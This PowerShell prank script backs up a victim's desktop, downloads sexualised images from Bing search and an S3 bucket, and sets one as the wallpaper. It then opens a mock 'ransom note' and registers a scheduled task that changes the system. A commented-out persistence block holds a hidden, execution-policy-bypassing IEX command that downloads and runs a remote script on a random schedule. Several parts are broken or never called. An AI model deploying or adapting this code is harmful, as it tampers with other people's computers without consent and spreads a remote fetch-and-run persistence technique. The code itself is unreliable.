Install-PackageProvider -Name NuGet -Scope CurrentUser -Force
Install-Module BingCmdlets -Scope CurrentUser -Force
Import-Module BingCmdlets

# Check the backup folder and set current desktop
$backupFolder = 'C:\Goofin\cuts'
$desktop = [Environment]::GetFolderPath([Environment+SpecialFolder]::Desktop)
$targets = Get-childitem $desktop
If(!(Test-Path $backupFolder)) {
        New-Item -Path $backupFolder -ItemType directory
}
foreach ($t in $targets.FullName){Copy-Item $t $backupFolder -ErrorAction SilentlyContinue}


# enumerate targets for replacement & grab number of butts needed for grand plan
$buttCount = $targets.Count

$downloadFolder = 'C:\Goofin\butts'
If(!(Test-Path $downloadFolder)) {
        New-Item -Path $downloadFolder -ItemType directory
}

$APIKey = Get-Content '.\bing.api'
$bing =  Connect-Bing -APIKey "$APIKey"



$searchTerms = '"Big Butt" + "Yoga Pants"'
$imageSearch = Select-Bing -Connection $bing -Table "ImageSearch" -Where "SearchTerms = `'$searchTerms`'"
$payload = $imageSearch | select -first "$buttCount"
$urls = $payload | %{$_.ContentUrl}
foreach ($url in $urls) {
    Invoke-WebRequest $url -OutFile "$downloadFolder" -Force
}


# replace desktop shortcut .lnk files with .jpg files from butts
# Should have it pull each file name and replace itself with that string
# $links = Get-ChildItem -Path $desktop  -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -eq '.lnk' }
# foreach($link in $links) { Write-Output $link.Basename }
function Replace-Butts {
    [CmdletBinding(Mandatory)]
    param(
[string]$targetFiles = "lnk",
[string]$targetRename = "jpg",
[string]$directory = "$env:TEMP"
)
# Start from scratch
#
}
$filesToReplace = (Get-ChildItem -Path $directory -Filter *$targetFiles* -Recurse).Fullname


# Hit 'em with it
# retrieve background image from S3
$buttGrab = Invoke-WebRequest -uri "https://buttboss.s3.us-east-1.amazonaws.com/butt-wall-paper.jpg" -OutFile $downloadFolder\background.jpg
$buttBackground = $downloadFolder\background.jpg

Function Set-WallPaper ($Image = $buttBackground) {
param (
    [parameter(Mandatory=$True)]
    # Provide path to image
    [string]$Image,
    # Provide wallpaper style that you would like applied
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)

$WallpaperStyle = Switch ($Style) {
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
}

If($Style -eq "Tile") {
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
}
Else {
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Params
{
    [DllImport("User32.dll",CharSet=CharSet.Unicode)]
    public static extern int SystemParametersInfo (Int32 uAction,
                                                   Int32 uParam,
                                                   String lpvParam,
                                                   Int32 fuWinIni);
}
"@

    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02

    $fWinIni = $UpdateIniFile -bor $SendChangeEvent

    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

# Write the ransom note, pop notepad, Invoke-Chills
echo "Now who's boss." | Out-File -FilePath "C:\Goofin\buttbossin.txt"
notepad "C:\Goofin\buttbossin.txt"

# Politeness Module
# Reset the photots and icons after within 24 hours.

$unbutt = New-ScheduledTaskAction -Execute "powershell.exe Copy-Item -Path 'C:\Goofin\cuts' -Destination $desktop -Recurse -Force"
$scheduleunbutt = New-ScheduledTasktrigger -Once -At 12pm
Register-ScheduledTask GoodByeButts -Action $unbutt -Trigger $scheduleunbutt

# Persistence Module / Scheduled Task
# Commented out because it seemed irresponsible to have it be the default. This way people can play with it and not get butt'ed back in a week or two
#
# Get a random number between 1 week and 25 days to re-butt the system
# $reseed = 7..25 | Get-Random
# [int]$reseed
#  $rebutt = New-ScheduledTaskAction -Execute "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://github.com/mellonaut/buttboss/buttboss.ps1'''))'"
#  $schedulebutts = New-ScheduledTasktrigger -Daily -DaysInterval $reseed -At 10am
#  Register-ScheduledTask BringBackTheButts -Action $rebutt -Trigger $schedulebutts
# )
